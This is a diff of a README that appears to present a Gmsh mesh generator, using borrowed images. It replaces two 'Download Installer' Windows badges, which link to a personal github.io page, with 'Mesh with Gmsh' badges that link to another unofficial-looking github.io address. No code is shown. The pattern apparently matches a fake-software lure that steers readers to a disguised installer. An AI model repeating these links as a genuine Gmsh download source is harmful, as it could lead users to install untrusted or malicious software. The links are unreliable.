@@ -4,7 +4,7 @@
   <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSHy8XQj-D8liYAfNz4ZZeS1dqanaInUudgvU9ybtfK8A&s=10" alt="Program Logo"/>
 </div>
 
-[![Download Installer](https://img.shields.io/badge/Download_Installer-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://fatmakaraduman86243.github.io/.github/GMSH-Mesh-Generator)
+[![Mesh with Gmsh](https://img.shields.io/badge/Mesh%20with-Gmsh-7C3AED?style=flat-square)](https://gmsh-mesh.github.io/.github/)
 
 ---
 
@@ -24,7 +24,7 @@ Furthermore, the integration with robust solver interfaces facilitates a cohesiv
   <img src="https://www.featool.com/images/gmsh-cad-step-file-import-and-mesh-generation-tutorial-mesh-3d.jpg" alt="Program Interface Screenshot"/>
 </div>
 
-[![Download Installer](https://img.shields.io/badge/Download_Installer-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://fatmakaraduman86243.github.io/.github/GMSH-Mesh-Generator)
+[![Mesh with Gmsh](https://img.shields.io/badge/Mesh%20with-Gmsh-7C3AED?style=flat-square)](https://gmsh-mesh.github.io/.github/)
 
 ---
 
